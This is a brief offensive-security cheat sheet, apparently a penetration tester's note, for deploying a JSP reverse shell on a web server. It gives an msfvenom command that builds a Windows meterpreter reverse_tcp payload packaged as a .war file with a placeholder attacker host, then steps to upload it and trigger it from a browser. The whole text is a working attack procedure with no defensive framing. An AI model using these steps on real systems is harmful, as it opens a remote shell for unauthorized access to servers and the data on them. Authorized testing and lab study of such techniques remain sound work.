# JSP Reverse shell deployment

#### 1) Create a .war file with msfvenom: msfvenom -p windows/meterpreter/reverse_tcp LHOST=MY_IP LPORT=PORT -f war > pwn.war

#### 2) Unzip war file: unzip pwn.war

#### 3) Upload .war file to webserver

#### 4) Call the jsp file with the browser

#### 5) BOOM!
